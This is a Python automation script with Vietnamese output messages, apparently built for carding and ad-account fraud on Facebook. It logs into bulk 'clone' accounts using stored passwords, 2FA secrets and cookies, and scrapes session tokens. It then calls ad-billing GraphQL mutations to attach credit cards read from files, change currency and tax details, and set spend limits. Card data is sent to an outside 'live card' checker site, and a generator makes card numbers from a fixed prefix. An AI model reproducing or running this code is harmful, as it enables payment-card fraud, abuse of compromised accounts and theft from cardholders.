from time import sleep as sl
from http.cookies import SimpleCookie
from bs4 import BeautifulSoup as BS
from requests import session
import random

import requests
import mechanize
from random import randint as ri

import threading

count_add_card_success=0
count_list_clone = 0

class Card:
	def __init__(self,code,date,ccv):
		self.code = code
		self.date = date
		self.ccv = ccv

class Acc:
	def __init__(self,tk,mk,fa,cookies):
		self.tk = tk
		self.mk = mk
		self.fa = fa
		self.cookies = cookies

def convert_cookie_to_json(string_cookie):
	temp= string_cookie.replace(" ", "")
	temp = temp.split(";")
	listKey = ["sb","datr","c_user","xs","fr"]
	listCookies = []
	for i in temp:
		key = i.split("=")[0]
		if key in listKey:
			listCookies.append(i)
	string_cookie=";".join(listCookies)
	try:
		cookie = SimpleCookie()
		cookie.load(string_cookie)
		cookies = {}
		for key, morsel in cookie.items():
		    cookies[key] = morsel.value
		return cookies
	except:
		return ""

def get2FA(fa):
	p = requests.get("https://2fa.live/tok/"+fa)
	return p.json()['token']

def listCloneCookie():
	f = open("clone.txt","r+")
	data = f.readlines()
	cookies = []
	for d in data:
		cookie = d.split("|")
		cookies.append(cookie[3])
	return cookies

# def listCloneAcc():
# 	f = open("clone.txt","r+")
# 	data = f.readlines()
# 	accs = []
# 	for d in data:
# 		a = d.split("|")
# 		fa = a[2]
# 		fa = fa.replace(" ","")
# 		acc = Acc(a[0],a[1],fa,a[3])
# 		accs.append(acc)
# 	return accs

# def listCloneAcc():
# 	f = open("clone.txt","r+")
# 	data = f.readlines()
# 	accs = []
# 	for d in data:
# 		cookie = d.split("|")
# 		fa = cookie[3]
# 		fa = fa.replace(" ","")
# 		acc = Acc(cookie[0],cookie[1],fa,cookie[2])
# 		accs.append(acc)
# 	return accs

def listCloneAcc(option):
	f = open("clone.txt","r+")
	data = f.readlines()
	accs = []
	if option==1:
		for d in data:
			cookie = d.split("|")
			fa = ""
			try:
				fa = cookie[3]
			except:
				fa = "khongco"
			fa = fa.replace(" ","")
			acc = Acc(cookie[0],cookie[1],fa,cookie[2])
			accs.append(acc)
		return accs
	else:
		for d in data:
			cookie = d.split("|")
			fa = cookie[2]
			fa = fa.replace(" ","")
			acc = Acc(cookie[0],cookie[1],fa,cookie[3])
			accs.append(acc)
		return accs
def listCard():
	f = open("card.txt","r+")
	data = f.readlines()
	cards = []	
	for c in data:
		temp = c.split("|")
		date = temp[1]+temp[2][2:]
		card = Card(temp[0],date,temp[3])
		cards.append(card)
	return cards

def getAccountId(driver):
	url = driver.current_url
	acc = url.split("account_id=")
	acc_id = ""
	for i in acc[1]:
		if i=="&":
			break
		acc_id+=i
	return acc_id
def get_fb_dtsg(cookies):
	try:
		gets = requests.get("https://www.facebook.com",cookies = cookies)
		soup = BS(gets.content, "html.parser")
		gets = str(gets.text)
		gets = cut_string(gets,'["DTSGInitialData",[],{"token":"',True)
		gets = cut_string(gets,'"',False)
		return gets
	except:
		return None
def setLimitWithApi(driver,tk,cookie):
	print("hello")
	cookies = convert_cookie_to_json(cookie)
	fb_dtsg = get_fb_dtsg(cookies)
	url = "https://m.facebook.com/api/graphql/"
	data = {
		'fb_dtsg': fb_dtsg,
		'fb_api_caller_class': 'RelayModern',
		'fb_api_req_friendly_name': 'useBillingUpdateAccountSpendLimitScreenMutation',
		'variables': '{"input":{"client_mutation_id":"8","actor_id":"'+tk+'","billable_account_payment_legacy_account_id":"'+getAccountId(driver)+'","new_spend_limit":{"amount":"0.1","currency":"USD"}}}',
		'doc_id': '5615899425146711'
	}
	requests.post(url,data = data, cookies = cookies)

def saveAccSuccess(acc,option):
	f = open("clonesuccess.txt","a+")
	cookies = acc.cookies.replace("\n","")
	fa = acc.fa.replace("\n","")
	f.write(acc.tk+"|"+acc.mk+"|"+cookies+"|"+fa+"\n")

def cut_string(string,key,choice):
	index = string.find(key)
	if choice:
		string = string[index+len(key):]
	else:
		string = string[0:index]
	return string

def get_account_id(cookies):
	url = "https://www.facebook.com/business_payments"
	p = requests.get(url,cookies = cookies)
	data = str(p.text)
	data = cut_string(data,'"props":{"account_id":"',True)
	data = cut_string(data,'"',False)
	return data

def set_country_and_currentcy(cookies,fb_dtsg,account_id):
	# url = "https://m.facebook.com/api/graphql/"
	# myID = cookies['c_user']
	# data = {
	# 	'fb_dtsg': fb_dtsg,
	# 	'variables': '{"input":{"client_mutation_id":"3","actor_id":"'+myID+'","billable_account_payment_legacy_account_id":"'+account_id+'","currency":"USD","logging_data":{"logging_counter":13,"logging_id":"113367954"},"tax":{"business_address":{"city":"","country_code":"US","state":"","street1":"","street2":"","zip":""},"business_name":"","is_personal_use":false,"second_tax_id":"","second_tax_id_type":null,"tax_exempt":false,"tax_id":"","tax_id_type":"NONE"},"timezone":"Asia/Jakarta"}}',
	# 	'doc_id': '5428097817221702'
	# }
	# requests.post(url,data = data, cookies = cookies)
	# print("đổi tiền thành công")
	url = "https://m.facebook.com/api/graphql/"
	myID = cookies['c_user']
	data = {
		'fb_dtsg': fb_dtsg,
		'variables': '{"input":{"client_mutation_id":"2","actor_id":"'+myID+'","billable_account_payment_legacy_account_id":"'+account_id+'","currency":null,"logging_data":{"logging_counter":10,"logging_id":"806193005"},"tax":{"business_address":{"city":"","country_code":"US","state":"","street1":"","street2":"","zip":""},"business_name":"","email":"","is_personal_use":false,"phone_number":"","second_tax_id":"","second_tax_id_type":null,"tax_exempt":false,"tax_id":"","tax_id_type":"NONE"},"timezone":"Asia/Jakarta"}}',
		'doc_id': '5428097817221702'
	}
	requests.post(url,data = data, cookies = cookies)
	print("đổi tiền thành công")
def set_country_and_currentcy_lol(cookies,fb_dtsg,account_id):
	try:
		url = "https://m.facebook.com/api/graphql/"
		myID = cookies['c_user']
		data = {
			'fb_dtsg': fb_dtsg,
			'variables': '{"input":{"client_mutation_id":"4","actor_id":"'+myID+'","billable_account_payment_legacy_account_id":"'+account_id+'","currency":"CNY","logging_data":{"logging_counter":19,"logging_id":"526291686"},"tax":{"business_address":{"city":"","country_code":"US","state":"","street1":"","street2":"","zip":""},"business_name":"","is_personal_use":false,"tax_id":"1234567891025"},"timezone":"Asia/Jakarta"}}',
			'doc_id': '5428097817221702'
		}
		requests.post(url,data = data, cookies = cookies)
		print("đổi tiền thành công")
	except:
		pass
def list_card():
	f = open("card.txt","r+")
	data = f.readlines()
	cards = []
	for c in data:
		temp = c.split("|")
		date = temp[1]+"|"+temp[2]
		card = Card(temp[0],date,temp[3])
		cards.append(card)
	return cards

def list_card_2():
	f = open("card2.txt","r+")
	data = f.readlines()
	cards = []
	for c in data:
		temp = c.split("|")
		date = temp[1]+"|"+temp[2]
		card = Card(temp[0],date,temp[3])
		cards.append(card)
	return cards

def check_added_card(cookies,fb_dtsg,account_id):
	url = "https://m.facebook.com/api/graphql/"
	headers = {
				'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7'
	}
	data = {
		'fb_dtsg': fb_dtsg,
		'variables': '{"paymentAccountID":"'+account_id+'"}',
		'doc_id': '5286352154719076'
	}
	p = requests.post(url,data=data,cookies = cookies,headers = headers)
	try:
		data = p.json()
		check_added_card = data['data']['viewer']['billable_accounts']['edges'][0]['node']['funding_source']['display_string']
		if "VISA" in check_added_card:
			return True
		return False
	except:
		return False

def add_card(cookies,fb_dtsg,account_id,card):
	# myID = cookies['c_user']
	# url = "https://m.secure.facebook.com/ajax/payment/token_proxy.php?tpe=%2Fapi%2Fgraphql%2F"
	# card_first_6 = card.code[:6]
	# card_last_4 = card.code[len(card.code)-4:]
	# date = card.date.split("|")
	# month = date[0]
	# year = date[1]

	# if int(month) < 10:
	# 	month = month[1]

	# data = {
	# 	'fb_dtsg': fb_dtsg,
	# 	'variables': '{"input":{"client_mutation_id":"6","actor_id":"'+myID+'","billing_address":{"country_code":"US"},"billing_logging_data":{"logging_counter":28,"logging_id":"3221251053"},"cardholder_name":"abcde","credit_card_first_6":{"sensitive_string_value":"'+card_first_6+'"},"credit_card_last_4":{"sensitive_string_value":"'+card_last_4+'"},"credit_card_number":{"sensitive_string_value":"'+card.code+'"},"csc":{"sensitive_string_value":"'+card.ccv+'"},"expiry_month":"'+month+'","expiry_year":"'+year+'","payment_account_id":"'+account_id+'","payment_type":"MOR_ADS_INVOICE","unified_payments_api":true}}',
	# 	'doc_id': '4126726757375265'
	# }
	# requests.post(url,data = data, cookies = cookies)
	myID = cookies['c_user']
	url = "https://m.secure.facebook.com/ajax/payment/token_proxy.php?tpe=%2Fapi%2Fgraphql%2F"
	card_first_6 = card.code[:6]
	card_last_4 = card.code[len(card.code)-4:]
	date = card.date.split("|")
	month = date[0]
	year = date[1]

	if int(month) < 10:
		month = month[1]

	data = {
		'fb_dtsg': fb_dtsg,
		'variables': '{"input":{"client_mutation_id":"6","actor_id":"'+myID+'","billing_address":{"country_code":"US"},"billing_logging_data":{"logging_counter":26,"logging_id":"806193005"},"cardholder_name":"abcdefghik","credit_card_first_6":{"sensitive_string_value":"'+card_first_6+'"},"credit_card_last_4":{"sensitive_string_value":"'+card_last_4+'"},"credit_card_number":{"sensitive_string_value":"'+card.code+'"},"csc":{"sensitive_string_value":"'+card.ccv+'"},"expiry_month":"'+month+'","expiry_year":"'+year+'","payment_account_id":"'+account_id+'","payment_type":"MOR_ADS_INVOICE","unified_payments_api":true}}',
		'doc_id': '4126726757375265'
	}
	requests.post(url,data = data, cookies = cookies)
def add_card_2(cookies,fb_dtsg,account_id,card):
	pass
def set_tax_after_add_card(cookies,fb_dtsg,account_id):
	myID = cookies['c_user']
	url = "https://m.facebook.com/api/graphql/"
	data={
		'fb_dtsg': fb_dtsg,
		'variables': '{"input":{"client_mutation_id":"11","actor_id":"'+myID+'","billable_account_payment_legacy_account_id":"'+account_id+'","currency":null,"logging_data":{"logging_counter":57,"logging_id":"806193005"},"tax":{"business_address":{"city":"sacxvxc","country_code":"US","state":"CA","street1":"ABC","street2":"ABC2","zip":"75031"},"business_name":"retbcvnvf","is_personal_use":false,"second_tax_id":"","tax_id":""},"timezone":null}}',
		'doc_id': '5428097817221702'
	}
	requests.post(url,data=data,cookies=cookies)
def set_limit(cookies,fb_dtsg,account_id):
	myID = cookies['c_user']
	url = "https://m.facebook.com/api/graphql/"
	data = {
		'fb_dtsg': fb_dtsg,
		'fb_api_caller_class': 'RelayModern',
		'fb_api_req_friendly_name': 'useBillingUpdateAccountSpendLimitScreenMutation',
		'variables': '{"input":{"client_mutation_id":"8","actor_id":"'+myID+'","billable_account_payment_legacy_account_id":"'+account_id+'","new_spend_limit":{"amount":"1","currency":"USD"}}}',
		'doc_id': '5615899425146711'
	}
	requests.post(url,data = data, cookies = cookies)
	print("set limit thành công")
def set_tax(cookies,fb_dtsg,account_id):
	myID = cookies['c_user']
	url = "https://m.facebook.com/api/graphql/"
	data = {
		'fb_dtsg': fb_dtsg,
		'fb_api_caller_class': 'RelayModern',
		'fb_api_req_friendly_name': 'BillingAccountInformationUtilsUpdateAccountMutation',
		'variables': '{"input":{"client_mutation_id":"2","actor_id":"'+myID+'","billable_account_payment_legacy_account_id":"'+account_id+'","currency":null,"logging_data":{"logging_counter":9,"logging_id":"3577491254"},"tax":{"business_address":{"city":"abcdefgh","country_code":"US","state":"AK","street1":"abcdefgh","street2":"abcdefgh","zip":"10000"},"business_name":"abcdefgh","is_personal_use":false},"timezone":null}}',
		'doc_id': '5428097817221702'
	}
	requests.post(url,data = data, cookies = cookies)
	print("set tax thành công")
def change_language(cookies,fb_dtsg):
	url = "https://m.facebook.com/intl/ajax/save_locale/"
	data = {
		'fb_dtsg': fb_dtsg,
		'loc': 'en_US'
	}
	requests.post(url,data = data, cookies = cookies)
def approve(cookies,fb_dtsg,account_id):
	myID = cookies['c_user']
	url = "https://m.facebook.com/api/graphql/"
	data = {
		'fb_dtsg': fb_dtsg,
		'fb_api_caller_class': 'RelayModern',
		'fb_api_req_friendly_name': 'useBillingPreauthPermitMutation',
		'variables': '{"input":{"client_mutation_id":"1","actor_id":"'+myID+'","billable_account_payment_legacy_account_id":"'+account_id+'","entry_point":"BILLING_2_0"}}',
		'doc_id': '3514448948659909'
	}
	requests.post(url,data = data, cookies = cookies)
def get_card_id_2(cookies,fb_dtsg,account_id):
	url = "https://m.facebook.com/api/graphql/"
	headers = {
				'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7'
	}
	data = {
		'fb_dtsg': fb_dtsg,
		'variables': '{"paymentAccountID":"'+account_id+'"}',
		'doc_id': '5286352154719076'
	}
	p = requests.post(url,data=data,cookies = cookies,headers = headers)
	try:
		data = p.json()
		card_id = data['data']['billable_account_by_payment_account']['billing_payment_account']['billing_payment_methods'][1]['credential']['credential_id']
		return card_id
	except:
		return ""
def change_default_card(cookies,fb_dtsg,account_id):
	myID = cookies['c_user']
	card_id = get_card_id_2(cookies,fb_dtsg,account_id)
	url = "https://www.facebook.com/api/graphql/"
	data = {
		'fb_dtsg': fb_dtsg,
		'variables' : '{"input":{"billable_account_payment_legacy_account_id":"'+account_id+'","primary_funding_id":"'+card_id+'","actor_id":"'+myID+'","client_mutation_id":"1"}}',
		'doc_id': '4755021711179260'
	}
	p = requests.post(url,data = data, cookies = cookies)
	print("Đổi default thẻ thành công")
def auto_add_card(acc,option):
	global count_add_card_success
	global list_card_2
	global index_list_card_2
	global count_add_list_card_2
	check_add_card_success = False
	# cookies = convert_cookie_to_json(acc.cookies)
	string_cookie = getCookie(login(acc.tk,acc.mk,acc.fa))
	print(string_cookie)
	cookies = convert_cookie_to_json(string_cookie)
	fb_dtsg = get_fb_dtsg(cookies)
	print(fb_dtsg)
	sl(3)
	change_language(cookies,fb_dtsg)
	sl(3)
	account_id = get_account_id(cookies)
	print(account_id)
	sl(5)
	set_country_and_currentcy_lol(cookies,fb_dtsg,account_id)
	sl(3)
	for i in range(3):
		if not check_added_card(cookies,fb_dtsg,account_id):
			sl(3)
			card = random.choice(list_card())
			add_card(cookies,fb_dtsg,account_id,card)
		else:
			set_tax_after_add_card(cookies,fb_dtsg,account_id)
			card2 = list_card_2[count_add_list_card_2]
			
			# if index_list_card_2==1:
			# 	index_list_card_2 = 0
			# 	count_add_list_card_2+=1
			# index_list_card_2+=1
			count_add_list_card_2+=1
			
			if count_add_list_card_2 < len(list_card_2):
				print("add thẻ mới: "+card2.code)
				add_card(cookies,fb_dtsg,account_id,card2)
			check_add_card_success = True
			break
	### add the 2


	if check_add_card_success:
		sl(2)
		set_limit(cookies,fb_dtsg,account_id)
		sl(2)
		# set_tax(cookies,fb_dtsg,account_id)
		if get_card_id_2(cookies,fb_dtsg,account_id) != "":
			saveAccSuccess(acc,option)
		count_add_card_success+=1
		print("Add thành công: "+str(count_add_card_success)+"/"+str(count_list_clone))

		# ### change default
		# change_default_card(cookies,fb_dtsg,account_id)
	else:
		print("Thẻ đã chết hoặc clone đã die")
def check_live_card_2(card):
	url = "https://checker.visatk.com/ccn1/alien07.php"
	card_val = card.code+"|"+card.date+"|"+card.ccv
	data = {
		'ajax': '1',
		'do': 'check',
		'cclist': card_val
	}
	p = requests.post(url,data=data)
	print(p.text)
def login(email,pw,fa):
	browser = mechanize.Browser()
	browser.set_handle_robots(False)
	cookies = mechanize.CookieJar()
	browser.set_cookiejar(cookies)
	browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
	# browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.46 Safari/534.7')]


	browser.set_handle_refresh(False)
	url = 'http://m.facebook.com/login.php'
	browser.open(url)
	browser.select_form(nr = 0)
	browser.form['email'] = email
	browser.form['pass'] = pw
	response = browser.submit()

	browser.open("https://m.facebook.com/checkpoint/?__req=7")
	browser.select_form(nr = 0)
	browser.form['approvals_code'] = get2FA(fa)
	response = browser.submit()

	for i in range(3):
		try:
			browser.open("https://m.facebook.com/login/checkpoint/")
			browser.select_form(nr = 0)
			response = browser.submit()
		except:
			pass

	return str(browser._ua_handlers['_cookies'].cookiejar)
	
def reg_list_card_2(quantity):
	list_card_2 = []
	for i in range(quantity):
		code = "40165802"+str(ri(12345873,98798786))
		date = "05|2025"
		ccv = str(ri(112,989))
		card = Card(code,date,ccv)
		list_card_2.append(card)
	return list_card_2

def getCookie(listCookies):
	listCookies = listCookies.split("CookieJar")
	listCookies = listCookies[1]
	listCookies = listCookies[1:len(listCookies)-2]
	listCookies = " "+listCookies
	listCookies = listCookies.split(",")
	result = ""
	for cookie in listCookies:
		temp = cookie.split(" ")
		if temp[2]!="noscript=1":
			result+=temp[2]+";"
	result = result[0:len(result)-1]
	return result

def delete_card_2(count_clone):
	f = open("card2.txt","r+")
	data = f.readlines()
	f.truncate(0)
	f.close()
	count_card = 0
	f = open("card2.txt","a+")
	for i in data:
		
		if count_card >=count_clone:
			card = i.replace("\n","")
			f.write(card+"\n")
		count_card+=1

option = 2
arrThread = []
listClone = listCloneAcc(option)
list_card_2 = list_card_2()
# list_card_2 = reg_list_card_2(len(listClone))
index_list_card_2 = 0
count_add_list_card_2 = 0
count = 1
count_list_clone = len(listClone)
for acc in listClone:
	t = threading.Thread(target = auto_add_card,args=(acc,option,))
	arrThread.append(t)
	# break
for t in arrThread:
	t.start()

delete_card_2(len(listClone))